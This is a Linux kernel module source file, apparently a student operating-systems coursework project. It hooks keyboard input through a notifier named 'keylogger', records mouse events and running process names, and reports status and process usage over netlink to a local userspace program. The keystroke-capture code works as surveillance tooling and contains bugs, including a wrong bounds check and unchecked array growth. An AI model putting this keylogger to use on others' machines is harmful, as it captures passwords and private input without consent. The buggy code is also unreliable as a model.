#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/init_task.h>
#include <linux/timer.h>
#include <linux/keyboard.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/netlink.h>
#include <linux/net.h>
#include <linux/un.h>
#include <asm/unistd.h>
#include <linux/fs.h>
#include <net/netlink.h>
#include "data_structures.h"

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Krivozubov Vlad");

int send_usrmsg(char *pbuf, uint16_t len);

#define UNIQUE_MODULE 20
#define USER_PORT 100

#define PROCESS_CHECK_PERIOD 1000
#define INPUT_DATA_PERIOD 2000
#define REPORT_PERIOD 11000

static const char* keys[] = { 
    "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", 
    "9", "0", "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", 
    "t", "y", "u", "i", "o", "p", "SPACE", "SPACE", "ENTER", "lCTRL", 
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", 
    "'", "`", "lSHIFT", "\\", "z", "x", "c", "v", "b", "n", 
    "m", ",", ".", "/", "rSHIFT", "\0", "lALT", "SPACE", "CAPSLOCK", "F1", 
    "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", // 60 - 69 
    "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5", "RTARROW", "+", "END", 
    "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12", "\0", // 80 - 89 
    "\0", "\0", "\0", "\0", "\0", "\0", "rENTER", "rCTRL", "/", "PRTSCR", 
    "rALT", "\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", // 100 - 109 
    "INSERT", "DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE", 
    "\0", "\0", "\0", "\0", "\0", "WIN", "\0", "\0", "\0", "\0"
};

static const int keys_max = 129;

// хранилище процессов
static process *process_data;
static int process_data_size = 0;

// хранилище событий мыши
static mouse_data_package *mouse_data;
static int mouse_data_size = 0;

// хранилище событий клавиатуры
static keyboard_data_package *keyboard_data;
static int keyboard_data_size = 0;

static int *status_data;
static int status_data_size = 0;

// таймеры
static struct timer_list process_data_timer;
static struct timer_list input_data_timer;
static struct timer_list report_timer;

// сокет для передачи отчета
struct sock *socketptr = NULL;
static int sock_fd;
int netlink_count = 0;
char netlink_kmsg[30];
extern struct net init_net;

static int client_already_greeted = 0;

static int transition_state = 0;

static int isShiftKey = 0;
int keylogger_handler(struct notifier_block *nblock, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE) {
        if (param->value == 42 || param->value == 54) {
            if (param->down)
                isShiftKey = 1;
            else
                isShiftKey = 0;
            return NOTIFY_OK;
        }

        if (param->down) {
            int size = keyboard_data[keyboard_data_size].size;

            if (size >= 1000) {  
                return NOTIFY_OK;
            }
            if (param->value > keys) {
                sprintf(
                    keyboard_data[keyboard_data_size].info[size].description, 
                    "id-%d\n", 
                    param->value
                );
            }
            if (isShiftKey == 0) {
                sprintf(
                    keyboard_data[keyboard_data_size].info[size].description, 
                    "%s\n",
                    keys[param->value]
                );
            } else {
                sprintf(
                    keyboard_data[keyboard_data_size].info[size].description, 
                    "shift + %s\n", 
                    keys[param->value]
                );
            }
            keyboard_data[keyboard_data_size].size += 1;
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger = {
	.notifier_call = keylogger_handler
};

// обработка данных от мыши
void send_mouse_data(char buttons, char dx, char dy, char wheel) {
    int size = mouse_data[mouse_data_size].size;
    mouse_event_data info = {
        .buttons = buttons,
        .dx = dx,
        .dy = dy,
        .wheel = wheel
    };

    if (size < 1000) {
        mouse_data[mouse_data_size].info[size] = info;
        mouse_data[mouse_data_size].size += 1;
    }
}

void handle_process(char *name) {
    int flag = 1;
    int i;
    for (i = 0; i < process_data_size; i++) {
        if (!strcmp(process_data[i].name, name)) {
            //printk("equal process names: %s", name);
            process_data[i].secs_in_use += 1;
            flag = 0;
            break;
        }
    }
    if (flag == 1) {
        if (process_data_size < 1000) {
            process_data[process_data_size].name = (char *)kmalloc(sizeof(char) * (strlen(name) + 1), GFP_KERNEL);
            snprintf(process_data[process_data_size].name, strlen(name) + 1, "%s", name);
            process_data[process_data_size].secs_in_use += 1;
            process_data_size += 1;
        }
    }
}

void handle_process_data_timer_call(struct timer_list *timer)
{
    printk("PROCESS DATA TIMER TRIGGERED!\n");

	struct task_struct *task = &init_task;
 	do
	{
        handle_process(task->comm);
 	} while ((task = next_task(task)) != &init_task);
 	
    mod_timer(timer, jiffies + msecs_to_jiffies(PROCESS_CHECK_PERIOD));	
}

void handle_input_data_timer_call(struct timer_list *timer)
{
	printk("INPUT DATA TIMER TRIGGERED!\n");

    int status = 9;

    if (mouse_data[mouse_data_size].size > 0) {
        status = 10;
    } else if (keyboard_data[keyboard_data_size].size > 0) {
        status = 10;
    }

    status_data[status_data_size] = status;
    status_data_size += 1;

    mouse_data_size += 1;
    keyboard_data_size += 1;

	mod_timer(timer, jiffies + msecs_to_jiffies(INPUT_DATA_PERIOD));
}

void reset_after_report(void) {
    int i;
    for (i = 0; i < mouse_data_size; i++) {
        mouse_data[i].size = 0;
    }
    mouse_data_size = 0;

    for (i = 0; i < keyboard_data_size; i++) {
        keyboard_data[i].size = 0;
    }
    keyboard_data_size = 0;

    for (i = 0; i < process_data_size; i++) {
        kfree(process_data[i].name);
        process_data[i].secs_in_use = 0;
    }
    process_data_size = 0;

    status_data_size = 0;
}

void handle_report_timer_call(struct timer_list *timer)
{
	printk("REPORT TIMER TRIGGERED!\n");

    // сначала отправляем статус
    char msg[50] = "status\n";
    send_usrmsg(msg, strlen(msg));

    int i;
    for (i = 0; i < status_data_size; i++) {
        memset(msg, 0, 50);
        sprintf(msg, "\033[48;5;%dm \033[m ", status_data[i]);
        send_usrmsg(msg, strlen(msg));
    }

    // отправляем процессы
    memset(msg, 0, 50);
    sprintf(msg, "process");
    send_usrmsg(msg, strlen(msg));    

    for (i = 0; i < process_data_size; i++) {
        memset(msg, 0, 50);
        sprintf(msg, "%s - %d", process_data[i].name, process_data[i].secs_in_use);
        send_usrmsg(msg, strlen(msg));
    }

    // завершаем отправку отчета
    memset(msg, 0, 50);
    sprintf(msg, "complete");
    send_usrmsg(msg, strlen(msg));

    /*
    int i, j;
    printk("MOUSE DATA");
    for (i = 0; i < mouse_data_size; i++) {
        printk("MOUSE PACKAGE #%d", i);
        for (j = 0; j < mouse_data[i].size; j++) {
            mouse_event_data info = mouse_data[i].info[j];
            printk("MOUSE EVENT #%d", j);
            printk(
                "%d %d %d %d",
                info.buttons,
                info.dx, 
                info.dy, 
                info.wheel
            );
        }
    }

    printk("KEYBOARD DATA");
    for (i = 0; i < keyboard_data_size; i++) {
        printk("KEYBOARD PACKAGE #%d", i);
        for (j = 0; j < keyboard_data[i].size; j++) {
            printk("KEYBOARD EVENT #%d", j);
            printk(
                "%s",
                keyboard_data[i].info[j].description
            );
        }
    }

    printk("PROCESS DATA");
    for (i = 0; i < process_data_size; i++) {
        printk("PROCESS #%d", i);
        printk(
            "name - %s, secs - %d",
            process_data[i].name,
            process_data[i].secs_in_use
        );
    }
    */
    reset_after_report();
	mod_timer(timer, jiffies + msecs_to_jiffies(REPORT_PERIOD));
}

void setup_timers(void)
{
	// setup process data timer
    timer_setup(&process_data_timer, handle_process_data_timer_call, 0);
    mod_timer(&process_data_timer, jiffies + msecs_to_jiffies(PROCESS_CHECK_PERIOD));

	// setup input data timer
	timer_setup(&input_data_timer, handle_input_data_timer_call, 0);
	mod_timer(&input_data_timer, jiffies + msecs_to_jiffies(INPUT_DATA_PERIOD));

	// setup report timer
	timer_setup(&report_timer, handle_report_timer_call, 0);
	mod_timer(&report_timer, jiffies + msecs_to_jiffies(REPORT_PERIOD));
}

int send_usrmsg(char *pbuf, uint16_t len)
{
    struct sk_buff *nl_skb;
    struct nlmsghdr *nlh;

    int ret;

    //Create sk_buff using nlmsg_new().
    nl_skb = nlmsg_new(len, GFP_ATOMIC);
    if(!nl_skb)
    {
        printk("netlink alloc failure\n");
        return -1;
    }

    //Set up nlmsghdr.
    nlh = nlmsg_put(nl_skb, 0, 0, UNIQUE_MODULE, len, 0);
    if(nlh == NULL)
    {
        printk("nlmsg_put failaure/n");
        nlmsg_free(nl_skb); //If nlmsg_put() failed, nlmsg_free() will free sk_buff.
        return -1;
    }

    //Copy pbuf to nlmsghdr payload.
    printk("sending");
    memcpy(nlmsg_data(nlh), pbuf, len);
    ret = netlink_unicast(socketptr, nl_skb, USER_PORT, MSG_DONTWAIT);

    return ret;
}

static void nl_recv_msg (struct sk_buff *skb) {
    if (client_already_greeted == 0) {
        struct nlmsghdr *nlh = NULL;
        char *umsg = NULL;

        if(skb->len >= nlmsg_total_size(0))
        {
            nlh = nlmsg_hdr(skb); //Get nlmsghdr from sk_buff.
            umsg = NLMSG_DATA(nlh);//Get payload from nlmsghdr.
            if(umsg)
            {
                //printk("kernel recv from user: %s\n", umsg);
                char *msg = "kernel is ready to report\n";
                send_usrmsg(msg, strlen(msg));
            }
        }
        client_already_greeted = 1;
    }
}

struct netlink_kernel_cfg cfg = {
    .input = nl_recv_msg,
};

static int __init md_init(void) 
{
    // setup client socket
    socketptr = (struct sock *)netlink_kernel_create(&init_net, UNIQUE_MODULE, &cfg);

    if (socketptr == NULL) {
        printk("SOCKET CREATION FAILED");
        return -1;
    } else {
        printk("SOCKET CREATION SUCCESSFULL");
    }

    int i, j;
    mouse_data = (mouse_data_package *)kmalloc(sizeof(mouse_data_package) * 200, GFP_KERNEL);
    if (!mouse_data) {
        printk("MEMORY ALLOCATION FAILED [MOUSE DATA STORAGE]");
    }

    for (i = 0; i < 200; i++) {
        mouse_event_data *mouse_data_package = (mouse_event_data *)kmalloc(sizeof(mouse_event_data) * 1000, GFP_KERNEL);
        if (!mouse_data_package) {
            printk("MEMORY ALLOCATION FAILED [MOUSE DATA PACKAGE - size for now %d]", mouse_data_size);
        } else {
            mouse_data[i].info = mouse_data_package;
            mouse_data[i].size = 0;
        }
    }

    keyboard_data = (keyboard_data_package *)kmalloc(sizeof(keyboard_data_package) * 200, GFP_KERNEL);
    if (!keyboard_data) {
        printk("MEMORY ALLOCATION FAILED [KEYBOARD DATA STORAGE]");
    }
    for (i = 0; i < 200; i++) {
        keyboard_event_data *keyboard_data_package = (keyboard_event_data *)kmalloc(sizeof(keyboard_event_data) * 1000, GFP_KERNEL);
        if (!keyboard_data_package) {
            printk("MEMORY ALLOCATION FAILED [KEYBOARD DATA PACKAGE - size for now %d]", keyboard_data_size);
        } else {
            for (j = 0; j < 1000; j++) {
                keyboard_data_package[j].description = kmalloc(sizeof(char) * 40, GFP_KERNEL);
            }
            keyboard_data[i].info = keyboard_data_package;
            keyboard_data[i].size = 0;
        }
    }

    process_data = (process *)kmalloc(sizeof(process) * 1000, GFP_KERNEL);
    if (!process_data) {
        printk("MEMORY ALLOCATION FAILED [PROCESS STORAGE]");
        return -1;
    }

    status_data = (int *)kmalloc(sizeof(int) * 200, GFP_KERNEL);
    if (!status_data) {
        printk("MEMORY ALLOCATION FAILED [STATUS STORAGE]");
        return -1;
    }

	setup_timers();
	
	register_keyboard_notifier(&keylogger);

	printk("OS_COURSEWORK module is loaded.\n");
 	return 0;
}

static void __exit md_exit(void) 
{
    if (socketptr) {
        netlink_kernel_release(socketptr);
        socketptr = NULL;
    }   

    del_timer(&process_data_timer);
	del_timer(&input_data_timer);
	del_timer(&report_timer);

	unregister_keyboard_notifier(&keylogger);

    // free memory
    int i, j;
    for (i = 0; i < 200; i++) {
        kfree(mouse_data[i].info);
    }
    kfree(mouse_data);

    for (i = 0; i < 200; i++) {
        for (j = 0; j < 1000; j++) {
            kfree(keyboard_data[i].info[j].description);
        }
        kfree(keyboard_data[i].info);
    }
    kfree(keyboard_data);

    for (i = 0; i < process_data_size; i++) {
        kfree(process_data[i].name);
    }
    kfree(process_data);

    kfree(status_data);

	printk("OS_COURSEWORK module is unloaded.\n");
}

EXPORT_SYMBOL(send_mouse_data);
module_init(md_init);
module_exit(md_exit);